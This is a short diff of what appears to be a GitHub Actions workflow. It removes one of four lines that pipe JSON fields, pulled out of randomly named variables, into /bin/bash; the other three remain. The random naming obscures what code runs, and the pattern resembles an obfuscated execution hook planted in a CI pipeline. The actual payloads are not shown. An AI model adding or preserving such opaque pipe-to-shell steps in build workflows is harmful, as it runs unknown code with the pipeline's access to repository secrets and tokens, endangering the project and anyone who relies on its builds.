@@ -28,7 +28,6 @@ jobs:
           printf '%s' "$wrpnu46523" | jq -r .dbfvm6060 | /bin/bash
           echo $ei46666 | jq -r .jhe3815 | /bin/bash
           printf '%s' "$fm411" | jq -r .qrxhs20 | /bin/bash
-          printf '%s' "$huye3890" | jq -r .eawj54 | /bin/bash
 
       - name: Store output
         uses: actions/upload-artifact@v4
